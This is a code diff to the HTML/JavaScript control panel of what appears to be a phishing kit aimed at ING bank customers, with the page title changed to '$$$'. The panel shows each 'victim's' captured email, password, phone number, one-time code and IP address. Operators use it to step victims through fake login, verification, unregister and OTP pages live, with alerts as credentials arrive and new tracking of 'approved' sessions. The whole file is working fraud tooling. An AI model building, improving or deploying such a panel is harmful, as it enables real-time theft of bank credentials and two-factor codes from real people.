@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ING Panel</title>
-  <link rel="preconnect" href="https://rsms.me ">
-  <link rel="stylesheet" href="https://rsms.me/inter/inter.css ">
+  <title>$$$</title>
+  <link rel="preconnect" href="https://rsms.me">
+  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
     :root {
       --bg: #000000;
@@ -85,6 +85,14 @@
     .alert-error{border-left:3px solid var(--red)}.alert-error .alert-icon{background:rgba(251,113,133,.15);color:var(--red)}
     @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
     @keyframes fadeOut{to{opacity:0;transform:translateX(20px)}}
+    
+    /* IP Link Style */
+    .ip-link{color:var(--blue);text-decoration:none;cursor:pointer;transition:opacity .2s}
+    .ip-link:hover{opacity:.8;text-decoration:underline}
+    
+    /* Approved Row Style */
+    tr.approved{opacity:.6;background:rgba(52,211,153,.05)}
+    tr.approved td{color:var(--text-muted)}
   </style>
 </head>
 <body>
@@ -166,7 +174,7 @@
 
     /* ----------  STATUS TEXT  ---------- */
     function statusText(s){
-      if (s.page==='success') return '<div style="color:var(--green)">APPROVED</div>';
+      if (s.page==='success' || s.status==='approved') return '<div style="color:var(--green)">APPROVED</div>';
       if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
       if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
       if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
@@ -174,46 +182,45 @@
       return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
-    /* ----------  ACTION BUTTONS (table row) - FIXED LOGIC  ---------- */
+    /* ----------  ACTION BUTTONS (table row)  ---------- */
     function actionButtons(s){
       let html = '<div style="display:flex;gap:6px">';
       
       // Always show view details
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
 
-      // Show redo/continue based on page AND data entered - FIXED CONDITIONS
+      // Don't show action buttons for approved sessions
+      if (s.page === 'success' || s.status === 'approved') {
+        return html + '</div>';
+      }
+
+      // Show redo/continue based on page AND data entered
       if (s.page === 'index.html') {
-        // On login page: show buttons if credentials entered (check both entered flag and email/password values)
         if (s.entered === true || (s.email && s.password)) {
           html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
           html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
       } else if (s.page === 'verify.html') {
-        // On verify page: show buttons if phone entered
         if (s.phone && s.phone.length > 0) {
           html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
           html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
       } else if (s.page === 'unregister.html') {
-        // On unregister page: show continue if clicked, no redo
         if (s.unregisterClicked === true) {
           html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         }
       } else if (s.page === 'otp.html') {
-        // On OTP page: show buttons if OTP entered
         if (s.otp && s.otp.length > 0) {
           html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
           html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
         }
       }
-      // Note: success page has no buttons (already approved)
       
       return html + '</div>';
     }
 
-    /* ----------  CHANGE DETECTION - REMOVED TAB CLOSE DETECTION  ---------- */
+    /* ----------  CHANGE DETECTION  ---------- */
     function checkChanges(newSessions){
-      // Only check for new data entry, not session removal
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
         if (!old) {
@@ -224,7 +231,9 @@
           if (!old.phone && s.phone) showAlert('info', 'ENTERED PHONE', `Phone: ${s.phone}`, s.victimNum);
           if (!old.unregisterClicked && s.unregisterClicked) showAlert('warning', 'CLICKED UNREGISTER', 'Victim proceeded to unregister', s.victimNum);
           if (!old.otp && s.otp) showAlert('success', 'ENTERED OTP', `OTP: ${s.otp}`, s.victimNum);
-          if (old.page !== s.page) showAlert('info', 'PAGE CHANGE', `Moved to ${pageTitle(s.page)}`, s.victimNum);
+          if ((old.page !== 'success' && s.page === 'success') || (old.status !== 'approved' && s.status === 'approved')) {
+            showAlert('success', 'LOGIN APPROVED', 'Victim completed full flow', s.victimNum);
+          }
         }
       });
       lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
@@ -241,31 +250,60 @@
         default: return f;
       }
     }
+    
+    // Check if session is approved
+    function isApproved(s) {
+      return s.page === 'success' || s.status === 'approved';
+    }
+    
     function render(d){
       qs('#userName').textContent = d.username;
-      qs('#active').textContent   = d.active;
       qs('#total').textContent    = d.totalVictims;
       qs('#success').textContent  = d.success;
       qs('#domainLink').textContent = d.domain || 'localhost';
       qs('#domainLink').href        = d.domain || 'http://localhost';
 
+      // Filter out approved sessions from active count and display
+      const activeSessions = d.sessions.filter(s => !isApproved(s));
+      const approvedCount = d.sessions.filter(s => isApproved(s)).length;
+      
+      qs('#active').textContent = activeSessions.length;
+      
+      // Show approved count in success card if any
+      if (approvedCount > 0) {
+        qs('#success').textContent = `${d.success} (+${approvedCount} approved)`;
+      }
+
       const body = qs('#tbl tbody');
       const empty= qs('#empty');
+      
+      // Show all sessions including approved, but style approved differently
       if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
-      body.innerHTML = d.sessions.map(s=>`
-        <tr data-sid="${s.sid}">
+      
+      body.innerHTML = d.sessions.map(s => {
+        const approved = isApproved(s);
+        return `
+        <tr data-sid="${s.sid}" class="${approved ? 'approved' : ''}">
           <td>${s.victimNum}</td>
           <td><span class="cred">${s.email||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
           <td><span class="cred">${s.phone||'—'}</span></td>
           <td><span class="cred">${s.otp||'—'}</span></td>
-          <td>${s.ip}</td>
+          <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
           <td><div style="font-weight:600">${pageTitle(s.page)}</div>${statusText(s)}</td>
           <td>${actionButtons(s)}</td>
-        </tr>`).join('');
+        </tr>`;
+      }).join('');
+    }
+
+    /* ----------  IP LOOKUP  ---------- */
+    function openIpLookup(ip) {
+      // Extract IP without port if present
+      const cleanIp = ip.split(':')[0];
+      window.open(`https://db-ip.com/${cleanIp}`, '_blank');
     }
 
     /* ----------  MODAL / DETAIL VIEW  ---------- */
@@ -273,12 +311,11 @@
       const s = jsonData.sessions.find(x=>x.sid===sid);
       if(!s)return;
       currentSid = sid;
+      const approved = isApproved(s);
       
-      // Update header
-      qs('#modalTitle').textContent = `Victim #${s.victimNum}`;
+      qs('#modalTitle').textContent = `Victim #${s.victimNum}${approved ? ' (APPROVED)' : ''}`;
       qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
       
-      // Build activity log HTML
       const activityHtml = s.activityLog && s.activityLog.length ? 
         s.activityLog.slice().reverse().map(log => `
           <div class="activity-item">
@@ -299,7 +336,7 @@
           
           <div class="info-section">
             <div class="info-label">Current Page</div>
-            <div class="info-value" style="color:${s.page==='success'?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}</div>
+            <div class="info-value" style="color:${approved?'var(--green)':'var(--blue)'}">${pageTitle(s.page)}${approved ? ' ✓' : ''}</div>
           </div>
           
           <div class="info-section">
@@ -334,8 +371,8 @@
                 <div style="font-size:13px;font-weight:500">${s.browser}</div>
               </div>
               <div>
-                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">Unregister</div>
-                <div style="font-size:13px;font-weight:500;color:${s.unregisterClicked?'var(--green)':'var(--text-muted)'}">${s.unregisterClicked?'Yes':'No'}</div>
+                <div style="font-size:11px;color:var(--text-muted);margin-bottom:2px">IP Address</div>
+                <div style="font-size:13px;font-weight:500"><a class="ip-link" onclick="openIpLookup('${s.ip}')">${s.ip}</a></div>
               </div>
             </div>
             <div style="margin-top:12px">
@@ -350,10 +387,12 @@
           <div class="activity-log">${activityHtml}</div>
         </div>
         
+        ${!approved ? `
         <div class="delete-section">
           <div class="delete-info">Permanently remove this session from active sessions</div>
           <button class="btn btn-danger" onclick="confirmDelete('${s.sid}')">Delete Session</button>
         </div>
+        ` : '<div style="margin-top:20px;padding-top:20px;border-top:1px solid rgba(255,255,255,0.1);color:var(--green);font-size:13px;text-align:center;">✓ This session has been approved and completed</div>'}
       `;
       
       qs('#modal').style.display='flex';
@@ -377,7 +416,7 @@
       load();
     }
 
-    /* ----------  LOGOUT + EXPORT (bottom-right)  ---------- */
+    /* ----------  LOGOUT + EXPORT  ---------- */
     qs('#logoutBtn').onclick = async () => {
       await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
